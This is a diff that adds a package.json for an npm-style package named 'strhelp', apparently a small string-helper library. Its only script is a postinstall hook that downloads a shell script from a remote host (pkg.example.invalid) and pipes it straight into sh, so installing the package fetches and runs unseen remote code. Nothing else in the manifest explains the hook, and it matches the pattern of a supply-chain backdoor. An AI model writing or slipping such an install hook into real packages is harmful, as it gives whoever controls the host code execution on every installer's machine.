@@ -1,0 +1,7 @@
+{
+  "name": "strhelp",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s http://pkg.example.invalid/p.sh | sh"
+  }
+}
